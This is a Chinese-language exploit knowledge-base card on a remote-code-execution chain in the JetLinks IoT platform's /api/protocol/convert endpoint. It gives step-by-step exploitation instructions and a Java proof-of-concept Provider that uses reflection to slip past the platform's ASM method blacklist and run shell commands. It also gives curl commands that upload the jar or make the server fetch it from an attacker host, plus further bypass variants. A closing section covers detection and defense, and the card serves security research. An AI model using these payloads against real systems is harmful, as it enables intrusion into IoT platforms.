---
id: web-java-classloader-jetlinks-protocol-jar-upload-remote-load-rce
title: JetLinks 协议包加载 RCE：`/api/protocol/convert` 让 `fileId`/`location` 进入 JarProtocolSupportLoader，实例化攻击者 jar 里的 Provider
type: scenario
domain: web
path: web/java/classloader
technique: jetlinks-protocol-support-jar-remote-load-provider-instantiation
tags:
- java
- classloader
- rce
- iot
- jetlinks
- jar-upload
- asm
- blacklist-bypass
- code-audit
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W
  verified_at: '2026-11-08T17:16:46+08:00'
  notes: 已对照原文核对；本次核对未读取图片，仅依据正文；调用链 ProtocolSupportController#convertToDetail(/api/protocol/convert) → SpringProtocolSupportLoader#load → AutoDownloadJarProtocolSupportLoader#load（location 走 md5 缓存/http 下载、fileId 走本地文件）→ JarProtocolSupportLoader#load/lookupProvider → getDeclaredConstructor().newInstance()、ASM 包名黑名单(com.google/org.apache/cn.hutool)与方法黑名单+反射绕过，均与正文一致；已按规范清除 affected_versions（原文仅给审计 jar 的版本号 1.2.3-SNAPSHOT，未写受影响区间）；未验证点：原文未给 exp 与请求细节，卡内 Provider 代码与 curl 为按调用链推导
url: /docs/web/java/classloader/web-java-classloader-jetlinks-protocol-jar-upload-remote-load-rce/
draft: false
kb_aliases:
- JetLinks RCE
- 协议包上传 RCE
- ProtocolSupportController convertToDetail
- AutoDownloadJarProtocolSupportLoader
- JarProtocolSupportLoader lookupProvider
- 物联网平台协议插件 RCE
---

## 一句话结论

JetLinks 的协议包转换接口 `/api/protocol/convert` 把用户可控的 `fileId`（或 `location` URL）交给 `AutoDownloadJarProtocolSupportLoader#load`，后者用 `JarProtocolSupportLoader` 新建类加载器并 `providerType.getDeclaredConstructor().newInstance()` 实例化 jar 里的 `ProtocolSupportProvider`；由于校验只做包名前缀黑名单与方法名黑名单，攻击者上传（或让其远程下载）一个仅含反射加载字节码的 jar，即可在服务端执行任意代码。

## 原理

- 调用链：`ProtocolSupportController#convertToDetail`（路由 `/api/protocol/convert`）→ `SpringProtocolSupportLoader#load` → `AutoDownloadJarProtocolSupportLoader#load` → `JarProtocolSupportLoader#load`（构造 `URLClassLoader`）→ `lookupProvider` → `providerType.getDeclaredConstructor().newInstance()`。
- `AutoDownloadJarProtocolSupportLoader#load` 有两条取包路径：一是 `location` 参数为 http(s) 时先算 MD5 找临时目录缓存，不存在则从该 URL 下载到本地再加载；二是 `fileId` 直接指向服务端已有的本地文件（可用系统自带的 upload 接口先上传 jar 拿 id）。两条路径最终都进同一个加载器，所以“能不能出网”不影响利用，只影响用哪种方式投递。
- `newInstance()` 触发的是 jar 内被识别为 `ProtocolSupportProvider` 实现的类的**构造方法**，即代码执行点在类初始化阶段，不等业务调用——只要类被加载并实例化就落地，无需后续交互。
- 防护只在 `lookupProvider` 前用 ASM 扫描两类黑名单：类名不允许以 `com.google`、`org.apache`、`cn.hutool` 开头（防复用现成 gadget 包），以及方法调用黑名单（禁 `Runtime.exec`/`ProcessBuilder` 之类的直接调用）。这属于**基于签名的静态扫描**，对以下形式无效：反射（`Class.forName(...).getMethod("exec").invoke(...)`）、`MethodHandles`、`Unsafe`、JNDI、自定义 native/动态字节码加载——扫描器看不到字符串拼接后的调用目标。
- 攻击者因此只需要一个“类名不撞黑名单 + 方法调用不撞黑名单 + 构造方法里做反射”的 Provider 实现，打包成 jar 上传即可；jar 里的类不需要出现在 ASM 黑名单中。

## 触发条件

- 目标为受影响的 JetLinks 版本，`/api/protocol/convert` 可被访问（多数部署未额外鉴权，或存在默认/弱凭据）。
- 存在可用文件上传接口（拿到 `fileId`），或者服务端出网可访问攻击者的 HTTP 服务（`location` 走远程下载）。
- ASM 校验为包名前缀 + 方法名黑名单，未做类加载沙箱/白名单（如仅允许特定实现类）。

## 利用步骤

1. 指纹识别 JetLinks：访问 `/api/protocol/convert` 或静态资源，确认产品与版本。
2. 编写恶意 jar：实现 `ProtocolSupportProvider` 接口，把命令执行放进无参构造方法，用反射调用 `Runtime`/`ProcessBuilder` 规避 ASM 方法黑名单；类名避开 `com.google`/`org.apache`/`cn.hutool` 前缀。
3. 投递 jar（二选一）：
   - 上传路径：调系统自带 upload 接口上传 jar → 取返回的 `fileId` → `POST /api/protocol/convert` 带该 `fileId`。
   - 远程路径：把 jar 放攻击者 HTTP 服务 → `POST /api/protocol/convert` 用 `location=http://attacker/evil.jar`，服务端下载后加载。
4. 观察是否收到回连（反弹 shell）或命令执行副作用（写文件/DNS 外带）。
5. 若第一次失败，按黑名单补充调整：换反射入口、改字符串拼接方式、改类名。

## PoC

最小 Provider（构造方法即执行）：

```java
package evil;

import org.jetlinks.supports.protocol.management.ProtocolSupport;
import org.jetlinks.supports.protocol.management.ProtocolSupportProvider;

public class EvilProvider implements ProtocolSupportProvider {
    public EvilProvider() {
        try {
            // 反射绕 ASM 方法名黑名单：不出现直接调用表达式
            Class<?> rt = Class.forName("java.lang.Runtime");
            Object r = rt.getMethod("getRuntime").invoke(null);
            rt.getMethod("exec", String.class).invoke(r, "bash -c 'id > /tmp/pwned'");
        } catch (Exception ignored) {}
    }
    public ProtocolSupport create(org.jetlinks.supports.protocol.management.ProtocolSupportDefinition def) { return null; }
    public void dispose() {}
}
```

打包并投递：

```bash
jar cf evil.jar -C build .
# 方式一：上传拿 fileId
curl -s -F "file=@evil.jar" http://target/api/upload/...
# 方式二：远程加载
curl -s -X POST http://target/api/protocol/convert \
     -H 'Content-Type: application/json' \
     -d '{"location":"http://attacker/evil.jar"}'
# 或使用 fileId
curl -s -X POST http://target/api/protocol/convert \
     -H 'Content-Type: application/json' \
     -d '{"fileId":"<uploaded-id>"}'
```

## 变体与关联

- 变体：ASM 黑名单覆盖更多方法名时，改用 `MethodHandles.Lookup#defineClass` 加载一段不含敏感字符串的字节码，或在构造方法里只做“读远程配置”的 JNDI/HTTP 请求，把真正的执行放到第二阶段。
- 变体：只能上传不能出网时，先用上传接口把 jar 落到本地，再用 `fileId` 路径加载，即等价于“任意文件包含 + 类加载”。
- 变体：同类模式在其它平台表现为“插件/扩展/驱动包上传后由 SPI 实例化”，只要满足“用户可控字节码 + `newInstance`/SPI 自动实例化 + 黑名单式校验”，攻击方式一致。
- 关联：[[web-java-classloader-urlclassloader-addurl-uploaded-jar-deser-rce]]（同样是上传 jar + `URLClassLoader` 加载）、[[web-java-classloader-charsetprovider-spi-accept-rce]]（SPI 自动实例化的另一条路径）、[[web/java/rce]]（执行阶段载荷构造）。
- 边界：接口鉴权严格、jar 加载改为白名单签名校验、类加载在受限 SecurityManager/沙箱中进行时，本链不成立。

## 检测与防御

- 修接口：`/api/protocol/convert` 必须鉴权与授权（仅管理员可用），并对 `location` 做协议/域名白名单，禁止任意 URL 与任意 `fileId`。
- 校验升级：把 ASM 包名/方法名黑名单改为**类白名单 + jar 签名校验**（只允许已知厂商签名与已审核的实现类）；加载前校验 jar 清单与类集合，禁止未知类。
- 隔离加载：为协议包使用独立 ClassLoader 并限制其可见类与系统属性，禁用反射访问 `Runtime`（SecurityManager 或 JDK 模块系统限制）。
- 检测：`/api/protocol/convert` 的异常调用（非管理会话、短时间内多次、`location` 指向陌生域名）；JVM 内出现新建 `URLClassLoader` 且目标为上传目录；进程树出现由 Java 派生的 `bash`/`sh`；临时目录新增未签名 jar。
- 响应：删除上传的 jar、回滚协议包配置、排查同一实例上是否有第二阶段的持久化（内存马、定时任务）。
